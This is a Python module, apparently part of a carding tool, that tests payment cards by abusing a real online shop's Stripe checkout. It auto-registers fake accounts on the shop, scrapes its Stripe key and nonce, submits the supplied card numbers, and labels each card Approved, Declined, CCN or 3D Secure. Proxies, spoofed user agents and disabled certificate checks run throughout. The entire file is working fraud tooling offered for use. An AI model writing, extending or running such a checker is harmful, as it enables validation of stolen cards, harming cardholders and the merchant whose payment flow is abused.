"""
Enhanced Stripe Auth Gateway using epicalarc.com
Based on StripeAuth.py from new files
Auto-registers users and extracts keys dynamically
"""

import requests
import re
import json
import random
from faker import Faker
from bs4 import BeautifulSoup
import urllib3
from gates.utilities import http_request, REQUEST_TIMEOUT
from gates.stripe_payment_intent import process_payment_intent

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake = Faker()

def stripe_auth_epicalarc_check(card_num, card_mon, card_yer, card_cvc, proxy=None):
    """
    Enhanced Stripe Auth check using epicalarc.com
    Tries Payment Intent API first, falls back to original implementation.
    
    Args:
        card_num: Card number
        card_mon: Expiry month (MM)
        card_yer: Expiry year (YY or YYYY)
        card_cvc: CVV code
        proxy: Optional proxy (format: host:port:user:pass)
    
    Returns:
        tuple: (status, proxy_live)
        status: "Approved", "Declined", "CCN", "3D Secure", or error message
    """
    # Try Payment Intent first
    try:
        result = process_payment_intent(card_num, card_mon, card_yer, card_cvc, proxy=proxy, timeout=30)
        if result and "APPROVED" in result.upper():
            return (result, True)
    except Exception:
        pass  # Fall through to original implementation
    
    # Fall back to original epicalarc implementation
    return _stripe_auth_epicalarc_check_original(card_num, card_mon, card_yer, card_cvc, proxy=proxy)


def _stripe_auth_epicalarc_check_original(card_num, card_mon, card_yer, card_cvc, proxy=None):
    from gates.utilities import parse_proxy
    
    domain = "https://www.epicalarc.com"
    session = requests.Session()
    session.verify = False
    
    proxy_live = "No"
    proxies = parse_proxy(proxy)
    if proxies:
        session.proxies.update(proxies)
    
    # Normalize year
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    try:
        # Step 1: Generate fake user
        fname = fake.first_name().lower()
        lname = fake.last_name().lower()
        email = f"{fname}{lname}{random.randint(1000,9999)}@example.com"
        password = fake.password(length=10, special_chars=True)
        
        # Step 2: Register user
        res = session.get(f"{domain}/my-account/", timeout=15)
        soup = BeautifulSoup(res.text, "html.parser")
        
        nonce_input = soup.find("input", {"name": "woocommerce-register-nonce"})
        referer_input = soup.find("input", {"name": "_wp_http_referer"})
        
        if not nonce_input or not referer_input:
            return ("Error: Registration form not found", proxy_live)
        
        reg_nonce = nonce_input["value"]
        referer = referer_input["value"]
        
        reg_data = {
            "email": email,
            "password": password,
            "register": "Register",
            "woocommerce-register-nonce": reg_nonce,
            "_wp_http_referer": referer,
        }
        
        reg_headers = {
            "origin": domain,
            "referer": f"{domain}/my-account/",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": fake.user_agent(),
        }
        
        session.post(f"{domain}/my-account/", headers=reg_headers, data=reg_data, timeout=15)
        
        # Step 3: Get payment method page and extract Stripe key + nonce
        res = session.get(f"{domain}/my-account/add-payment-method/", timeout=15)
        html = res.text
        
        stripe_pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
        
        if not stripe_pk_match or not nonce_match:
            return ("Error: Failed to extract Stripe key or nonce", proxy_live)
        
        stripe_pk = stripe_pk_match.group(0)
        setup_nonce = nonce_match.group(1)
        
        # Step 4: Create payment method via Stripe API
        stripe_headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": fake.user_agent(),
        }
        
        stripe_data = {
            "type": "card",
            "card[number]": card_num,
            "card[cvc]": card_cvc,
            "card[exp_year]": card_yer,
            "card[exp_month]": card_mon,
            "billing_details[address][postal_code]": "10001",
            "billing_details[address][country]": "US",
            "payment_user_agent": "stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element",
            "key": stripe_pk,
            "_stripe_version": "2024-06-20",
        }
        
        pm_response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=stripe_headers,
            data=stripe_data,
            timeout=15,
            verify=False
        )
        
        pm_json = pm_response.json()
        pm_id = pm_json.get("id")
        
        if not pm_id:
            error = pm_json.get("error", {})
            error_code = error.get("code", "")
            error_msg = error.get("message", "Unknown error")
            
            if "incorrect_cvc" in error_code or "incorrect_number" in error_code:
                return ("CCN", proxy_live)
            elif "card_declined" in error_code:
                return (f"Declined ({error_msg})", proxy_live)
            else:
                return (f"Error: {error_msg}", proxy_live)
        
        # Step 5: Confirm setup intent
        confirm_headers = {
            "x-requested-with": "XMLHttpRequest",
            "origin": domain,
            "referer": f"{domain}/my-account/add-payment-method/",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": fake.user_agent(),
        }
        
        confirm_data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": setup_nonce,
        }
        
        confirm_response = session.post(
            f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=confirm_headers,
            data=confirm_data,
            timeout=15
        )
        
        result_text = confirm_response.text
        
        # Parse result
        try:
            result_json = json.loads(result_text)
            
            if result_json.get("success") and result_json.get("data", {}).get("status") == "succeeded":
                setupintent = result_json["data"].get("id", "N/A")
                proxy_live = "Yes"
                return (f"Approved ✅ (SI: {setupintent[:20]}...)", proxy_live)
            
            elif result_json.get("data", {}).get("status") == "requires_action":
                return ("3D Secure Required", proxy_live)
            
            else:
                error_msg = result_json.get("data", {}).get("error", {}).get("message", "Declined")
                return (f"Declined ({error_msg})", proxy_live)
        
        except json.JSONDecodeError:
            # Check for common error patterns in text response
            if "incorrect_cvc" in result_text.lower():
                return ("CCN", proxy_live)
            elif "success" in result_text.lower():
                return ("Approved ✅", proxy_live)
            else:
                return (f"Declined", proxy_live)
    
    except requests.exceptions.Timeout:
        return ("Error: Request timeout", proxy_live)
    except requests.exceptions.RequestException as e:
        return (f"Error: {str(e)[:50]}", proxy_live)
    except Exception as e:
        return (f"Error: {str(e)[:50]}", proxy_live)


if __name__ == "__main__":
    # Test the gateway
    print("Testing Stripe Auth (Epicalarc) Gateway")
    print("="*50)
    
    test_card = "4242424242424242|12|25|123"
    parts = test_card.split("|")
    
    status, proxy = stripe_auth_epicalarc_check(parts[0], parts[1], parts[2], parts[3])
    
    print(f"Card: {parts[0]}")
    print(f"Status: {status}")
    print(f"Proxy: {proxy}")
